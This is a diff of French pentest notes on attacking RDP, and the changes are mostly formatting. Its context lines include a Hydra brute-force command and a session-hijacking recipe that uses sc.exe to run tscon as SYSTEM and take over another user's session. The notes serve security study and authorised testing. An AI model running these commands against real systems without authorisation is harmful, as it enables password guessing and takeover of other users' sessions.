@@ -2,6 +2,7 @@
 public: true 
 #Tags: tag1, tag2
 ---
+
 Port : 3389/tcp
 
 ## Enumeration
@@ -30,7 +31,8 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 Outil permettant d'identifier les paramètres de sécurité d'un serveur RDP sans s'authentifier
-https://github.com/CiscoCXSecurity/rdp-sec-check
+
+<https://github.com/CiscoCXSecurity/rdp-sec-check>
 
 ```
 $ sudo cpan
@@ -99,10 +101,13 @@ rdesktop -u $AD_USER -p $AD_PASSWORD $TARGET_IP
 ### Exploits
 
 - Bluekeep (fix en 2019)
- 
+
 ### Brute force RDP avec Hydra
+
  ```
+
 hydra -L user.list -P password.list rdp://$TARGET_IP
+
 ```
 
 ### RDP Session Hijacking
@@ -111,18 +116,25 @@ Objectif : basculer sur une session RDP d'une autre session RDP (sans saisie de 
 Prérequis : être administrateur local (pour pouvoir devenir SYSTEM)
 
 ```
+
 # On récupère sa session active et celle que l'on souhaite hijacker
+
 query user
+
  USERNAME              SESSIONNAME       ID  STATE   IDLE TIME  LOGON TIME
+
 >attacker              rdp-tcp#1          1  Active          7  8/25/2021 1:23 AM
  lewen                 rdp-tcp#2          2  Active          *  8/25/2021 1:28 AM
 
 # Creation d'un service qui lancera TSCON.EXE en tant que SYSTEM
 ## tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+
 sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"
 
 # Lancement du service
+
 net start sessionhijack
+
 ```
 
 ### RDP Pass the Hash
